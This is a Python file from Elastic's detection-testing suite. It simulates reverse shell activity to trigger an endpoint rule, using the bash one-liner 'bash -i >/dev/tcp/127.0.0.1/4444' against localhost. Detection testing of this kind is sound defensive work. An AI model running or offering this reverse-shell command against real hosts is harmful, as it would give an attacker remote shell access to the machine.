# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import _common


@register_code_rta(
    id="83b04be5-ed0f-4efd-a7fd-d5db2b8ab62f",
    platforms=["macos", "linux"],
    endpoint_rules=[
        {
            "rule_name": "Potential Reverse Shell Activity via Terminal",
            "rule_id": "d0e45f6c-1f83-4d97-a8d9-c8f9eb61c15c",
        }
    ],
    siem_rules=[],
    techniques=["T1071", "T1059"],
)
def main():
    _common.log("Executing command to simulate reverse shell execution")
    _common.execute(['bash -c "bash -i >/dev/tcp/127.0.0.1/4444" 0>&1'], shell=True)


